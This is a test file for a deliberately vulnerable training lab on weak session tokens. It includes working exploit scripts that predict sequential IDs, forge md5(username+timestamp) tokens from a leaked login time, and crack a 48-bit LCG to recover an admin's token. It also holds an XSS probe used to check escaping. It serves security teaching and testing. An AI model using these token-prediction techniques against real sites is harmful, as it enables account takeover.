// src/districts/gatekeeper/gk-17-weak-session-id/gk-17.spec.ts
import { createHash } from 'node:crypto';
import { describe, it, expect } from 'vitest';
import request from 'supertest';
import { freshSession, describeExploitMatrix, FLAG_RE, setCookieValue, type Agent } from '../../../../tests/helpers.js';
import { LEVELS, type Level } from '../../../core/levels.js';
import { GK17 } from './challenge.js'; // registers GK-17 before createApp() inside freshSession
import { labState } from './model.js';

const LAB = '/d/gatekeeper/weak-session-id';
const COOKIE = 'citadel_sid';
const ADMIN = 'citadel_admin';

interface Ctx { agent: Agent; level: Level; sid: string }
/** An exploit (or ordinary use) written as a small script against the lab, like a player would. */
type Script = (c: Ctx) => Promise<request.Response>;

const appOf = (agent: Agent) => (agent as unknown as { app: never }).app;
const visit = (c: Ctx) => c.agent.get(`${LAB}?level=${c.level}`);
const login = (c: Ctx) => c.agent.post(`${LAB}?level=${c.level}`).type('form').send({ username: 'pilgrim', password: 'pilgrim' });
/** Open the admin page presenting ONLY this lab cookie (no jar: the player's own cookie is not sent). */
const adminWith = (c: Ctx, token: string) =>
  request(appOf(c.agent)).get(`${LAB}/admin?level=${c.level}`).set('Cookie', `hvwa_sid=${c.sid}; ${COOKIE}=${token}`);
const tokenOf = (res: request.Response): string => setCookieValue(res, COOKIE) ?? '';

/** Try each guess at the admin page; the first response that lets us in (not "Admin only"), else the last response. */
async function tryAll(c: Ctx, guesses: string[]): Promise<request.Response> {
  let last: request.Response | undefined;
  for (const g of guesses) {
    last = await adminWith(c, g);
    if (!last.text.includes('Admin only')) return last;
  }
  return last!;
}

// --- The exploits -------------------------------------------------------------------------
// Acolyte: ids are 1, 2, 3 ...: the admin's id sits right next to yours.
const acolyteExploit: Script = async (c) => {
  await visit(c);
  const mine = tokenOf(await login(c));
  const n = /^\d+$/.test(mine) ? Number(mine) : 1000;
  return tryAll(c, [n - 1, n + 1, n - 2, n + 2, n - 3].map(String));
};

// Templar: md5(username + login epoch), and the "recent activity" panel tells the admin's login epoch.
const templarExploit: Script = async (c) => {
  const page = await visit(c);
  const epoch = /signed in at epoch (\d+)/.exec(page.text)?.[1] ?? String(Math.floor(Date.now() / 1000));
  const guess = createHash('md5').update(`${ADMIN}${epoch}`).digest('hex');
  return tryAll(c, [guess]);
};

// Inquisitor: a 48-bit LCG (java.util.Random constants) showing its top 32 bits. The guest token you get
// on arrival and the one you get at login are two outputs with the admin's in between: recover the
// hidden low 16 bits from the pair, step once, read off the admin's token.
const MASK = (1n << 48n) - 1n;
const step = (s: bigint) => (s * 0x5DEECE66Dn + 0xBn) & MASK;
const hex8 = (s: bigint) => (s >> 16n).toString(16).padStart(8, '0');
function predictBetween(first: string, third: string): string[] {
  const out: string[] = [];
  if (!/^[0-9a-f]{8}$/.test(first) || !/^[0-9a-f]{8}$/.test(third)) return out;
  for (let low = 0n; low < 65536n; low++) {
    const s1 = (BigInt(`0x${first}`) << 16n) | low;
    const s2 = step(s1);
    if (hex8(step(s2)) === third) out.push(hex8(s2));
  }
  return out;
}
const inquisitorExploit: Script = async (c) => {
  const guest = tokenOf(await visit(c));
  const mine = tokenOf(await login(c));
  const candidates = predictBetween(guest, mine);
  return tryAll(c, candidates.length > 0 ? candidates : ['deadbeef']);
};

describeExploitMatrix<Script>({
  challenge: GK17,
  path: LAB,
  send: (agent, level, script, _url, { sid }) => script({ agent, level, sid }),
  exploits: { acolyte: acolyteExploit, templar: templarExploit, inquisitor: inquisitorExploit },
  resisted: /Admin only/,
  legit: [
    {
      name: 'own account pilgrim/pilgrim',
      input: async (c) => { await visit(c); return login(c); },
      expect: 'Signed in as pilgrim',
    },
    {
      name: 'pilgrim opens the admin page with their own session',
      input: async (c) => { await visit(c); const mine = tokenOf(await login(c)); return adminWith(c, mine); },
      expect: 'Admin only',
    },
  ],
  malformed: [], // no query, no parser: nothing that can raise a database error
  privileged: {
    name: 'the real admin session',
    input: async (c) => { await visit(c); return adminWith(c, labState(c.sid, c.level).adminToken); },
    expect: /Citadel admin console/,
  },
});

describe('GK-17 token schemes', () => {
  it('acolyte: sequential integers; your guest, the admin, and your login are consecutive', async () => {
    const { agent, sid } = await freshSession();
    const c: Ctx = { agent, level: 'acolyte', sid };
    const guest = Number(tokenOf(await visit(c)));
    const mine = Number(tokenOf(await login(c)));
    expect(Number.isInteger(guest)).toBe(true);
    expect(Number(labState(sid, 'acolyte').adminToken)).toBe(guest + 1);
    expect(mine).toBe(guest + 2);
  });

  it('templar: md5(username + login epoch seconds), and the panel publishes the admin\'s login epoch', async () => {
    const { agent, sid } = await freshSession();
    const state = labState(sid, 'templar');
    state.now = () => 1_731_700_123_456;
    const page = await visit({ agent, level: 'templar', sid });
    expect(page.text).toContain('citadel_admin signed in at epoch 1731700123');
    expect(state.adminToken).toBe(createHash('md5').update('citadel_admin1731700123').digest('hex'));
    expect(tokenOf(page)).toBe(createHash('md5').update('guest1731700123').digest('hex'));
  });

  it('only templar publishes login times', async () => {
    for (const level of ['acolyte', 'inquisitor', 'divine'] as const) {
      const { agent, sid } = await freshSession();
      const page = await visit({ agent, level, sid });
      expect(page.text, level).not.toMatch(/at epoch \d+/);
      expect(page.text, level).toContain('citadel_admin');
    }
  });

  it('inquisitor: 8 hex characters from a 48-bit LCG; the pair predicts the admin\'s token (and only it)', async () => {
    const { agent, sid } = await freshSession();
    const c: Ctx = { agent, level: 'inquisitor', sid };
    const guest = tokenOf(await visit(c));
    const mine = tokenOf(await login(c));
    expect(guest).toMatch(/^[0-9a-f]{8}$/);
    expect(mine).toMatch(/^[0-9a-f]{8}$/);
    const candidates = predictBetween(guest, mine);
    expect(candidates).toContain(labState(sid, 'inquisitor').adminToken);
    expect(candidates.length).toBeLessThanOrEqual(3);
  });

  it('divine: 32 random bytes (64 hex), unrelated from one issue to the next, never repeated', async () => {
    const { agent, sid } = await freshSession();
    const c: Ctx = { agent, level: 'divine', sid };
    const seen = new Set<string>([tokenOf(await visit(c)), labState(sid, 'divine').adminToken]);
    for (let i = 0; i < 5; i++) seen.add(tokenOf(await login(c)));
    expect(seen.size).toBe(7);
    for (const t of seen) expect(t).toMatch(/^[0-9a-f]{64}$/);
  });
});

describe('GK-17 sessions', () => {
  it('the admin is signed in from the moment the lab starts, once per player and level', async () => {
    const a = await freshSession();
    const b = await freshSession();
    for (const level of LEVELS) {
      await visit({ agent: a.agent, level, sid: a.sid });
      await visit({ agent: b.agent, level, sid: b.sid });
    }
    // (Templar's md5(name + second) can legitimately coincide for two labs started in the same second.)
    for (const level of ['inquisitor', 'divine'] as const) {
      expect(labState(a.sid, level).adminToken, level).not.toBe(labState(b.sid, level).adminToken);
    }
    for (const level of LEVELS) expect(labState(a.sid, level).adminToken, level).not.toBe('');
    expect(new Set(LEVELS.map((l) => labState(a.sid, l).adminToken)).size).toBe(LEVELS.length);
  });

  it('a real admin token of one player is worthless in another player\'s lab', async () => {
    const a = await freshSession();
    const b = await freshSession();
    await visit({ agent: a.agent, level: 'divine', sid: a.sid });
    await visit({ agent: b.agent, level: 'divine', sid: b.sid });
    const stolen = labState(a.sid, 'divine').adminToken;
    const res = await adminWith({ agent: b.agent, level: 'divine', sid: b.sid }, stolen);
    expect(res.text).toContain('Admin only');
    expect(res.text).not.toMatch(FLAG_RE);
  });

  it('flag only below Divine: the genuine admin session shows it, Divine never does', async () => {
    for (const level of ['acolyte', 'templar', 'inquisitor'] as const) {
      const { agent, sid } = await freshSession();
      await visit({ agent, level, sid });
      const res = await adminWith({ agent, level, sid }, labState(sid, level).adminToken);
      expect(res.text, level).toMatch(FLAG_RE);
    }
    const { agent, sid } = await freshSession();
    await visit({ agent, level: 'divine', sid });
    const res = await adminWith({ agent, level: 'divine', sid }, labState(sid, 'divine').adminToken);
    expect(res.text).toContain('Citadel admin console');
    expect(res.text).not.toMatch(FLAG_RE);
  });

  it('no cookie, an empty cookie and odd cookies are simply "Admin only", never a 500', async () => {
    const { agent, sid } = await freshSession();
    for (const level of LEVELS) {
      await visit({ agent, level, sid });
      for (const token of ['', 'null', '__proto__', 'constructor', '%00', 'x'.repeat(5000)]) {
        const res = await adminWith({ agent, level, sid }, token);
        expect(res.status, `${level} ${token.slice(0, 12)}`).toBe(200);
        expect(res.text, level).toContain('Admin only');
      }
      const bare = await request(appOf(agent)).get(`${LAB}/admin?level=${level}`).set('Cookie', `hvwa_sid=${sid}`);
      expect(bare.text, level).toContain('Admin only');
    }
  });

  it('a wrong password does not sign in; the admin cannot be logged into through the form', async () => {
    const { agent, sid } = await freshSession();
    for (const level of LEVELS) {
      const c: Ctx = { agent, level, sid };
      await visit(c);
      for (const creds of [{ username: 'pilgrim', password: 'nope' }, { username: ADMIN, password: 'pilgrim' }, { username: ADMIN, password: '' }]) {
        const res = await agent.post(`${LAB}?level=${level}`).type('form').send(creds);
        expect(res.text, level).toContain('Invalid username or password.');
        expect(res.text, level).not.toMatch(FLAG_RE);
      }
    }
  });
});

describe('GK-17 lab view', () => {
  it('tells the player their account, shows their session token and the recent activity, and posts back to the lab', async () => {
    const { agent } = await freshSession();
    const res = await agent.get(`${LAB}?level=acolyte`);
    expect(res.status).toBe(200);
    expect(res.text).toMatch(/pilgrim[\s\S]{0,40}\/[\s\S]{0,40}pilgrim/);
    expect(res.text).toContain(`Your session: <code>${tokenOf(res)}</code>`);
    expect(res.text).toContain('Recent activity');
    expect(res.text).toContain(`href="${LAB}/admin?level=acolyte"`); // absolute: a relative link would leave the lab
    expect(res.text).toContain('citadel_admin signed in');
    expect(res.text).not.toMatch(/type="password"/);
    expect(/<form[^>]*>/.exec(res.text)?.[0]).not.toContain('action');
  });

  it('keeps the typed username escaped; odd bodies are a failed login, never a 500', async () => {
    const { agent } = await freshSession();
    const res = await agent.post(`${LAB}?level=templar`).type('form').send({ username: '"><script>alert(1)</script>', password: 'x' });
    expect(res.text).toContain('value="&#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt;"');
    expect(res.text).not.toContain('<script>alert(1)');
    for (const level of LEVELS) {
      for (const body of [{ username: { toString: 1 }, password: ['a'] }, [1, 2], {}]) {
        const r = await agent.post(`${LAB}?level=${level}`).send(body);
        expect(r.status, `${level} ${JSON.stringify(body)}`).toBe(200);
        expect(r.text, level).not.toMatch(FLAG_RE);
      }
    }
  });

  it('marks success and failure messages for styling', async () => {
    const { agent } = await freshSession();
    const ok = await agent.post(`${LAB}?level=templar`).type('form').send({ username: 'pilgrim', password: 'pilgrim' });
    expect(ok.text).toMatch(/class="lab-message lab-success"[^>]*>Signed in as pilgrim/);
    const bad = await agent.post(`${LAB}?level=templar`).type('form').send({ username: 'pilgrim', password: 'x' });
    expect(bad.text).toMatch(/class="lab-message lab-error"/);
  });
});
